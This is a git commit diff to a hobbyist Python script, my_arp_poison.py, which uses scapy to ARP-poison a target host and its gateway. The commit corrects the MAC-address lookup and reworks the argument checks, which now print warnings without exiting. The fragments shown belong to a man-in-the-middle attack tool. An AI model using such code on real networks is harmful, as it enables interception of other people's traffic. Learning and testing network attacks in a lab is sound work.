9546733f7615532da87f13d2b400eed303b9f5f6
alperenilgaz <alperenilgaz3@gmail.com>
2022-10-10 16:35:25 -0400

    update

--- my_arp_poison.py
+++ my_arp_poison.py
@@ -9,7 +9,7 @@ def get_mac_address(ip):
     brodcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     combined_packet=brodcast_packet/arp_request
     answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
-    return answered_list[0][0].hwsrc
+    return answered_list[0][1].hwsrc
 
 def arp_poisoning(target_ip,poison_ip):
     target_mac=get_mac_address(target_ip)
@@ -29,13 +29,16 @@ def get_user_input():
     parse_object.add_option("-g","--gateway",dest="gateway_ip",help="enter gateway ip")
     user_input=parse_object.parse_args()[0]
 
+    if not user_input.target_ip:
+        print("Enter target IP")
+    if not user_input.gateway_ip:
+        print("Enter targe gateway IP")
+
     return user_input
 
-packet=0
+number=0
+
 user_ips=get_user_input()
-if not user_ips.target_ip or not user_ips.gateway_ip:
-    print("please enter target_ip and gateway_ip")
-    exit()
 user_target_ip=user_ips.target_ip
 user_gateway_ip=user_ips.gateway_ip
 
